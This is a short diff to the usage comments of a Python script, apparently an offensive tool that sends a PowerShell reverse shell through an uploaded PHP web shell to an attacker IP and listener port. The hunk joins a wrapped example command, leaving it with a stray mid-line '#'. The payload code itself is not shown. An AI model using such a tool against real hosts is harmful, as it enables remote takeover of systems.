@@ -7,8 +7,7 @@ import requests
 # 사용법:
 #   python3 send_powershell_reverse_shell_via_webshell.py <웹셸 URL> <공격자 IP> <리스너 포트>
 # 예:
-#   python3 send_powershell_reverse_shell_via_webshell.py \
-#       http://10.10.20.5/blog/uploads/shell.php 10.10.10.10 443
+#   python3 send_powershell_reverse_shell_via_webshell.py #       http://10.10.20.5/blog/uploads/shell.php 10.10.10.10 443
 #
 # 사전 준비:
 #   - 의존성: apt install python3-requests
